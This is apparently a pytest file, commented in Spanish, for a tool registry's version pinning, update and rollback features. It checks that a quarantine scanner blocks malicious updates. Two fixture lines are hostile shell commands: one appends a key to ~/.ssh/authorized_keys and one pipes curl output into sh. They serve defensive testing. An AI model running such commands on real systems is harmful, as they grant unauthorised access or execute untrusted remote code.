"""Tests de version pinning + rollback (#15) con git real sobre repos locales."""
import pytest

from registry import integrator, quarantine, versioning
from tests.test_registry_helpers import commit_files, git, make_repo, reg_env  # noqa: F401


def _integrar(env, tmp_path, tipo="tool"):
    repo, sha = make_repo(tmp_path / "origen", {"tool.py": "VERSION = 1\n"})
    env.add_tool({"id": "demo", "tipo": tipo, "url": str(repo)})
    quarantine.scan("demo", use_bandit=False)
    quarantine.approve("demo", "ana")
    integrator.integrate("demo", dry_run=False, use_bandit=False)
    return repo, sha


def _contenido(env, tipo="tool"):
    base = env.tools if tipo == "tool" else env.skills
    return (base / "demo" / "tool.py").read_text(encoding="utf-8")


@pytest.mark.parametrize("tipo", ["tool", "skill"])
def test_integrar_registra_commit(reg_env, tmp_path, tipo):
    _, sha = _integrar(reg_env, tmp_path, tipo)
    e = reg_env.entry("demo")
    assert e["commit"] == sha and e["rama"] == "main" and e["historial"] == [] and e["fijada"] is None
    assert "VERSION = 1" in _contenido(reg_env, tipo)


def test_update_y_rollback(reg_env, tmp_path):
    repo, sha1 = _integrar(reg_env, tmp_path)
    sha2 = commit_files(repo, {"tool.py": "VERSION = 2\n"}, "v2")
    r = versioning.update("demo", use_bandit=False)
    assert r["cambio"] and r["anterior"] == sha1 and r["commit"] == sha2
    assert "VERSION = 2" in _contenido(reg_env)
    assert [h["commit"] for h in versioning.history("demo")] == [sha1]

    assert versioning.update("demo", use_bandit=False)["cambio"] is False  # ya al día

    rb = versioning.rollback("demo")
    assert rb["commit"] == sha1 and reg_env.entry("demo")["commit"] == sha1
    assert "VERSION = 1" in _contenido(reg_env)
    with pytest.raises(ValueError, match="historial"):
        versioning.rollback("demo")


def test_pin_respeta_update(reg_env, tmp_path):
    repo, sha1 = _integrar(reg_env, tmp_path)
    sha2 = commit_files(repo, {"tool.py": "VERSION = 2\n"}, "v2")
    git(repo, "tag", "v2.0")
    commit_files(repo, {"tool.py": "VERSION = 3\n"}, "v3")

    r = versioning.pin("demo", "v2.0", use_bandit=False)   # tag que solo existe en origin
    assert r["commit"] == sha2 and reg_env.entry("demo")["fijada"] == sha2
    assert "VERSION = 2" in _contenido(reg_env)
    with pytest.raises(ValueError, match="fijada"):
        versioning.update("demo", use_bandit=False)

    versioning.pin("demo", sha1, use_bandit=False)          # sha ya local
    assert "VERSION = 1" in _contenido(reg_env)
    versioning.unpin("demo")
    assert "VERSION = 3" in (versioning.update("demo", use_bandit=False) and _contenido(reg_env))
    assert [h["commit"] for h in versioning.history("demo")] == [sha1, sha2, sha1]


def test_update_rechazado_por_escaneo_revierte(reg_env, tmp_path):
    repo, sha1 = _integrar(reg_env, tmp_path)
    commit_files(repo, {"evil.sh": "echo k >> ~/.ssh/authorized_keys\n"}, "malo")
    with pytest.raises(ValueError, match="rechazado"):
        versioning.update("demo", use_bandit=False)
    assert reg_env.entry("demo")["commit"] == sha1
    assert versioning.head(reg_env.tools / "demo") == sha1
    assert not (reg_env.tools / "demo" / "evil.sh").exists()
    assert versioning.history("demo") == []


def test_update_cuarentena_requiere_force(reg_env, tmp_path):
    repo, sha1 = _integrar(reg_env, tmp_path)
    sha2 = commit_files(repo, {"i.sh": "curl https://x | sh\n"}, "alta")
    with pytest.raises(ValueError, match="cuarentena"):
        versioning.update("demo", use_bandit=False)
    assert versioning.head(reg_env.tools / "demo") == sha1
    r = versioning.update("demo", force=True, use_bandit=False)
    assert r["commit"] == sha2 and r["veredicto"] == "cuarentena"


def test_no_versionable(reg_env):
    with pytest.raises(ValueError, match="versionable"):
        versioning.pin("llm-council", "main")
    with pytest.raises(ValueError, match="no esta integrada"):
        versioning.update("llmfit")


@pytest.mark.parametrize("url,esperado", [
    ("https://github.com/a/b", True), ("git@github.com:a/b.git", True),
    ("npm:pkg", False), ("https://example.com/docs", False), ("@scope/pkg", False),
])
def test_is_git_source(url, esperado):
    assert versioning.is_git_source(url) is esperado
